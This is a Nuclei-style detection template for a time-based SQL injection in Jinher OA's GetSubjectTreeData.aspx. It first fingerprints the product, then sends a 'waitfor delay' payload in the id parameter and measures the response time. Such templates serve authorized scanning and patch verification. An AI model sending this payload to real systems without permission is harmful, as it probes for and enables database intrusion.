id: poc-yaml-jinher-jhsoft-getsubjecttreedata-aspx-sqli
info:
  name: '\u91D1\u548COA GetSubjectTreeData.aspx SQL\u6CE8\u5165\u6F0F\u6D1E'
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(5, 10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/JHSoft.Web.CostControl/subClass/GetSubjectTreeData.aspx/?id=1'waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: word
        part: header
        words:
          - "Cookie:"
      - type: dsl
        dsl:
          - "duration >= t1 && duration <= t2"
